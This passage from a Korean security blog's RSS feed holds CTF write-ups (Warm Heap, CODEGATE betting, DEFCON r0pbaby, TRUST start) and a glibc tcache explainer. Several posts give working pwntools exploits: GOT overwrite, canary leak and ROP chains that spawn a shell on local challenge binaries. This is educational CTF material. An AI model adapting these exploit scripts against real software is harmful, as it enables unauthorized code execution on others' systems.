}</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinet_baby1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 Welcome</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinets_welcome/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinets_welcome/</guid>
      <pubDate>Mon, 25 Mar 2019 05:20:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;welcome&quot;&gt;&lt;a class=&quot;markdownIt-Anc
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="welcome"><a class="markdownIt-Anchor" href="#welcome"></a> Welcome</h2><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147319-ede93b00-7c94-11e9-8228-bb3321310e74.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147334-fe99b100-7c94-11e9-9160-a524f73291a7.PNG"><center><small>[wrapper.c]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147335-ff324780-7c94-11e9-8fb4-b27ed36dac65.PNG"><center><small>[Get FLAG]</small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinets_welcome/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Tcache Theory Analysis</title>
      <link>http://j0n9hyun.github.io/2019/03/19/tcache_theory/</link>
      <guid>http://j0n9hyun.github.io/2019/03/19/tcache_theory/</guid>
      <pubDate>Tue, 19 Mar 2019 01:21:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;tcache&quot;&gt;&lt;a class=&quot;markdownIt-Anch
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="tcache"><a class="markdownIt-Anchor" href="#tcache"></a> Tcache</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><center><small>[tcache_entry]</small></center><p>Ubuntu 17.04 에서 glibc 2.6 버전이 릴리즈 되었는데 <strong>tcache_entry</strong>와 <strong>tcache_perthread_struct</strong>라는 구조체가 새로 추가되었다.</p><h3 id="특징-br"><a class="markdownIt-Anchor" href="#특징-br"></a> 특징 <br></h3><ul><li>Single linked list(단일 연결 구조)를 이루고 있다.</li><li>Consolidate를 하지 않는다.</li><li>LIFO 구조를 가지고 있다.</li><li>Pointer가 오직 next chunk만 포함하고 있다.</li><li>기본적으로 Chunk Size는 24 ~ 1032 bytes 이다. (32bit : 12 ~ 516 bytes)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure><p>tcache bin 한 개당 기본적으로 7개의 Chunk를 가질 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[tcache_put]</small></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[tcache_get]</small></center><p><strong>tcache_put</strong>과 <strong>tcache_get</strong> 함수는 _int_free 와 __libc_malloc 함수가 시작할때 호출된다.<br><strong>tacace_get</strong>은 할당된 크기의 영역이 요청될때 0x408보다 작으면 호출된다.</p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037363-3eaf4580-7b68-11e9-9dec-a36a43808625.PNG"> <br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037374-41119f80-7b68-11e9-8533-5a9f1d95e084.PNG"><center><small>[free]</small></center><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037376-41aa3600-7b68-11e9-97e6-41660941aa5c.PNG"><center><small>[한번 더 free]</small></center>entry와 count가 보이는 것을 알 수 있다. <br> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/19/tcache_theory/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Warm Heap</title>
      <link>http://j0n9hyun.github.io/2019/03/05/warm_heap/</link>
      <guid>http://j0n9hyun.github.io/2019/03/05/warm_heap/</guid>
      <pubDate>Tue, 05 Mar 2019 02:22:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;warm-heap&quot;&gt;&lt;a class=&quot;markdownIt-A
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="warm-heap"><a class="markdownIt-Anchor" href="#warm-heap"></a> Warm Heap</h2><p><a href="https://github.com/j0n9hyun/CTF/files/3205199/warm_heap.zip" target="_blank" rel="noopener">Binary File</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v3 = <span class="number">1</span>;</span><br><span class="line">  *((_QWORD *)v3 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v4 = <span class="number">2</span>;</span><br><span class="line">  *((_QWORD *)v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v3 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v4 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small> [메인 함수] </small></center><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png"><center><small> [동작 과정] </small></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./warm_heap.bin'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./warm_heap.bin'</span>)</span><br><span class="line">flag = <span class="number">0x400826</span></span><br><span class="line">exit_got = <span class="number">0x601068d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">40</span> + p64(elf.got[<span class="string">'exit'</span>]) + <span class="string">"\n"</span> + p64(flag)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><small> [Exploit Code] </small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/05/warm_heap/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CODEGATE 2018 betting</title>
      <link>http://j0n9hyun.github.io/2019/02/19/betting/</link>
      <guid>http://j0n9hyun.github.io/2019/02/19/betting/</guid>
      <pubDate>Tue, 19 Feb 2019 13:30:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;betting&quot;&gt;&lt;a class=&quot;markdownIt-Anc
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="betting"><a class="markdownIt-Anchor" href="#betting"></a> betting</h2><p><a href="/j0n9hyun.github.io/upload/betting">Binary File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035930-d7dc5d00-7b64-11e9-8581-e606a56e1015.PNG"><center><small>[사진 1-1]</small></center>Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램을 실행해보자.  <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035931-d874f380-7b64-11e9-8bb1-919e07d13b2e.PNG"><center><small>[사진 1-2]</small></center><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035935-d9a62080-7b64-11e9-9c42-97bdfea0f6f7.PNG"><center><small>[사진 1-3]</small></center>함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./betting'</span>)</span><br><span class="line">helper = <span class="number">0x4008F6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">canary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"A"</span>*<span class="number">24</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"A"</span>*<span class="number">24</span> + <span class="string">"\n"</span>)</span><br><span class="line">    canary = u64(<span class="string">"\x00"</span> + r.recv()[:<span class="number">7</span>])</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += <span class="string">"A"</span>*<span class="number">40</span></span><br><span class="line">    payload += p64(canary)</span><br><span class="line">    payload += <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">    payload += p64(helper)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    canary()</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/02/19/betting/#disqus_thread</comments>
    </item>
    
    <item>
      <title>DEFCON 2015 r0pbaby</title>
      <link>http://j0n9hyun.github.io/2019/02/18/r0pbaby/</link>
      <guid>http://j0n9hyun.github.io/2019/02/18/r0pbaby/</guid>
      <pubDate>Mon, 18 Feb 2019 10:07:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;r0pbaby&quot;&gt;&lt;a class=&quot;markdownIt-Anc
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="r0pbaby"><a class="markdownIt-Anchor" href="#r0pbaby"></a> r0pbaby</h2><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3205617/r0pbaby.zip" target="_blank" rel="noopener">Binary File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147435-6bad4680-7c95-11e9-96ca-576020aa52ce.PNG"><center><small>[바이너리 보호기법 확인]</small></center><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147436-6cde7380-7c95-11e9-9ad8-299b2b6e15d3.PNG"><center><small>[실행 화면 메뉴]</small></center><blockquote><p>1번 진입시, libc의 주소를 알려준다. 하지만 확인해보니 실제 libc 주소는 아니었다.</p></blockquote><blockquote><p>2번 진입시, symbol 입력란이 추가로 뜨는데 여기서 system 함수의 주소를 알려준다.</p></blockquote><blockquote><p>3번 진입시, 최대 1024 바이트까지 버퍼를 보낼 수 있다. 우리가 최종적으로 페이로드를 보내는 곳이다.</p></blockquote><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147610-600e4f80-7c96-11e9-8101-128c723e35aa.PNG"><center><small>[system 함수 주소]</small></center><p>libc 주소는 달랐는데 system 주소는 동일하다. 고로 바로 recv 받아서 사용하면 된다. 이후부터는 오프셋 연산을 해주고 RTL 하면 되는데 익스가 안된다…여기서 은근히 시간을 많이 잡아먹었다. 생각해보니 PIE가 걸렸다는 점을 간과하고 있었던 것이다. <strong>PIE</strong>가 걸려있으면 실행할 때마다 가젯 주소가 계속 바뀌기 때문에 libc의 pop rdi ret을 가져와서 오프셋 연산을 해야 한다. 3번을 IDA로 확인하면 buffer를 savage라는 곳에다가 옮기는데 이 savage의 위치는 고맙게도 rbp+0h 에 있다. 즉, 바로 버퍼의 바로 뒤에 위치해 있다는 소리다. 고로 buf + sfp[rbp+0h] + RTL[binsh+system]이 들어갈 최종 페이로드가 된다. 이후부터는 스무스하게 슥삭 진행하면 익스 성공!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./r0pbaby'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">pr = <span class="number">0x21102</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"2"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"system"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">system_addr = int(r.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - system_offset</span><br><span class="line">pr_addr = libc_base + pr</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"3"</span>)</span><br><span class="line">r.sendline(<span class="string">"32"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pr_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/02/18/r0pbaby/#disqus_thread</comments>
    </item>
    
    <item>
      <title>TRUST CTF 2019 start</title>
      <link>http://j0n9hyun.github.io/2019/02/15/pwnstart/</link>
      <guid>http://j0n9hyun.github.io/2019/02/15/pwnstart/</guid>
      <pubDate>Fri, 15 Feb 2019 05:40:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;start&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="start"><a class="markdownIt-Anchor" href="#start"></a> start</h2><p><a href="/j0n9hyun.github.io/upload/start.zip">Binary File</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_4005E6 proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">pop     rax</span><br><span class="line">pop     rdx</span><br><span class="line">pop     rdi</span><br><span class="line">pop     rsi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><center><small>[sub_4005E6]</small></center>4개의 sub 함수 중 4005E6에는 pop gadget이 있다. <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x78</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[main]</small></center>바이너리 파일을 뜯어보면 sub로 시작하는 함수 4개와 메인함수가 있다.  언뜻봐도 알 수 있듯이 read 함수에서 BOF 취약점이 터지는 것을 확인할 수 있다.  보통은 write 같은 함수가 주어져야 하는데 read 함수밖에 없는 걸로 보아 일반적으로 하는 ROP 기법은 사용할 수 없다. 그래서 같이 주어져 있는 libc 파일에서 syscall 가젯을 사용한다.  주소값의 하위 3비트는 고정적인 값을 지니고 있기 때문에 read의 libc 주소 1 바이트를 syscall의 하위 1 바이트 주소로 바꿔서 보내면 된다. <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = remote('server.trustctf.com', 10392)</span></span><br><span class="line">r = process(<span class="string">'./start'</span>)</span><br><span class="line">e = ELF(<span class="string">'./start'</span>)</span><br><span class="line">pr = <span class="number">0x4005ed</span> <span class="comment"># pop rsi</span></span><br><span class="line">ppppr = <span class="number">0x4005ea</span> <span class="comment"># pop rax,rdx,rdi,rsi</span></span><br><span class="line">cmd = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">syscall = <span class="string">"\x7b"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">24</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.got[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.send(syscall)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/02/15/pwnstart/#disqus_thread</comments>
    </item>
    
    <item>
      <title>디미고 TRUST CTF 2019 1등</title>
